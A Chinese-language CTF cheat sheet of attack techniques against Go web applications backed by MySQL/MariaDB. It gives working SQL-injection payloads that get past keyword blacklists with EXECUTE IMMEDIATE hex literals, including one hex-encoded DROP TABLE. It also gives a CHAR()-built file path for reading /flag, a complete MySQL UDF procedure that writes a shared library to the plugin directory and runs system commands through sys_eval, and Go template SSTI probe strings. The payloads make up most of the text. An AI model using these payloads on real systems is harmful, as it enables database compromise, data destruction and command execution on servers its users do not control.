# Go Web 应用 CTF 通用攻击手法

## 1. Go 编译二进制逆向

### 字符串提取
Go 编译的二进制是静态链接的（通常 5-10MB），所有函数名、字符串都保留在二进制中（除非 strip）。

```sql
-- 通过 MySQL LOAD_FILE 读取二进制并搜索字符串
SELECT LOCATE('HandlerName', LOAD_FILE('/path/to/binary'));
SELECT SUBSTR(LOAD_FILE('/path/to/binary'), offset, 200);
```

常见搜索目标：
- `HandleFunc`、`Handle`、`mux` → 路由注册位置
- `/calc`、`/draw`、`/api` 等 → 路由路径
- `Handler` 后缀 → 处理器函数名（如 `calcHandler`、`drawHandler`）
- `init.func1`、`init.func2` → Go 初始化函数（通常注册路由）
- `text/template` vs `html/template` → 判断模板引擎类型（SSTI 可能）

### Go 二进制典型特征
- 7-10MB 大小（静态链接包含 Go runtime）
- 函数名格式: `package.(*Type).Method` 或 `package.FuncName`
- HTTP 框架常见: `net/http`（标准库）、`gin`、`echo`、`fiber`

## 2. SQL 注入黑名单绕过

### MariaDB EXECUTE IMMEDIATE X'hex'
当关键字（SELECT、UNION、=、DROP、CREATE 等）被过滤时：

```sql
-- 直接输入含关键字: 被拦截
-- 使用 EXECUTE IMMEDIATE X'hex': 完全绕过
-- hex 字符串仅包含 0-9、A-F，不可能触发关键字检测

-- 示例: 执行 SELECT 1
1; EXECUTE IMMEDIATE X'53454C4543542031'#

-- 示例: 执行 DROP TABLE
1; EXECUTE IMMEDIATE X'44524F50205441424C452074657374'#
```

### 多语句注入确认
```sql
-- 测试多语句是否可用
1; DO SLEEP(5)#  -- 如果有 5 秒延迟，确认多语句可用
```

### X'...' 格式 vs 0x... 格式
在某些 MariaDB 版本中，`EXECUTE IMMEDIATE` 后面可能要求使用 `X'...'` 格式（标准 SQL hex literal）而不是 `0x...`（MySQL-specific hex literal）。两者都试一下。

### 表名含下划线的处理
如果 `_` 被过滤，可以用 `EXECUTE IMMEDIATE` 加 hex 编码来引用含下划线的表名。

### 路径含敏感词的绕过
如果黑名单过滤 `FLAG` 在文件路径中：
```sql
-- 使用 CHAR() 构造路径，避免敏感词出现在输入中
LOAD DATA LOCAL INFILE CHAR(47,102,108,97,103) INTO TABLE testdb.x
-- CHAR(47,102,108,97,103) = '/flag'
```

## 3. MySQL UDF 命令执行标准流程

```sql
-- 前提: @@secure_file_priv 为空（无限制）或指向插件目录
-- 1. 下载 lib_mysqludf_sys_64.so（来自 Metasploit 或 sqlmap）
-- 2. 分块写入数据库
CREATE TABLE tmp_udf (id INT, chunk BLOB, hex_chunk TEXT);
INSERT INTO tmp_udf VALUES (1, UNHEX('...大量hex...'), '...hex...');

-- 3. 设置 group_concat_max_len
SET SESSION group_concat_max_len = 100000;

-- 4. 拼接并写入插件目录
SELECT UNHEX(GROUP_CONCAT(hex_chunk ORDER BY id SEPARATOR ''))
FROM tmp_udf INTO DUMPFILE '/usr/lib/mysql/plugin/mysqludf.so';

-- 5. 注册函数
CREATE OR REPLACE FUNCTION sys_exec RETURNS INTEGER SONAME 'mysqludf.so';
CREATE OR REPLACE FUNCTION sys_eval RETURNS STRING SONAME 'mysqludf.so';

-- 6. 执行系统命令
SELECT sys_eval('id');
SELECT sys_eval('ls /');
```

### 注意事项
- 分块大小不要超过 200 字节/块（hex 编码后 400 字符），避免 SQL 超长
- `INTO DUMPFILE` 写原始二进制（无转义、无换行），`INTO OUTFILE` 会加转义
- 验证文件大小: `SELECT LENGTH(LOAD_FILE('...'))`
- 如果 `GROUP_CONCAT` 不起作用，尝试 `SELECT CONCAT(...)` 或直接拼接

## 4. Go Template SSTI 检测

当 Go 应用同时使用 `text/template`（或 `html/template`）且存在 `parseTemplateString` 函数时：

```python
# 检测 SSTI
payloads = [
    "{{.}}",
    "{{printf '%s' 'test'}}",
    "{{.Flag}}",
    "{{.File}}",
    "{{template}}",
]

# text/template 不转义，html/template 会转义 HTML
# Go 的 text/template 沙箱较安全，但若有自定义 FuncMap 就可能危险
```

## 5. CRC32 在 CTF 中的常见用法
- 作为校验和验证数据完整性
- 作为"密钥"或"幸运数字"参与运算
- Go 和 MySQL 的 CRC32 实现相同（IEEE 802.3）
- 可能用于 XOR 解密、验证令牌、或作为表达式的一部分

## 6. Go 应用崩溃后的处理
- Go 应用崩溃后，openresty/nginx 反向代理会返回 502 或 404
- 尝试通过命令执行重启: `nohup /path/to/binary > /tmp/log 2>&1 &`
- 但 mysql 用户可能无权绑定端口或连接 MySQL
- 可能需要重新部署挑战实例
